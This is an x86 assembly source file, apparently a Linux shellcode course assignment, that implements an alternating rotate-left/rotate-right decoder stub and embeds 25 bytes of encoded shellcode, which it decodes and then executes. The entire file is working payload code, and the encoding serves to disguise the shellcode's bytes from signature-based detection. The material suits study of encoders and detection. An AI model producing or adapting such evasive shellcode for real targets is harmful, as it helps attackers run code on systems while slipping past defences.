; Author: Ty Gast // SLAE-1461
; Alternating rotate encoder
;   Encoding: first byte rotated right, alternate subsequent bytes
;   Decoding: first byte rotated left, alternate subsequent bytes

global _start


section .text
_start:

jmp short encoded_code

decoder:
  pop esi
  xor ecx, ecx
  mul ecx
  mov cl, 25	; this should be equal to the size of encoded shell

decode:
  test eax, 1
  jnz oddcount
evencount:
  rol byte [esi],1
  jmp passodd
oddcount:
  ror byte [esi],1
passodd:
  inc eax
  inc esi
  loop decode

  jmp short shellcode

encoded_code:
  call decoder
  shellcode: db 0x98,0x81,0x28,0xd0,0x37,0x5e,0xb9,0xd0,0x34,0x5e,0x97,0xc4,0xb4,0x13,0xf1,0xa0,0xc4,0xc5,0xa9,0x13,0xf0,0x61,0x85,0x9b,0x40
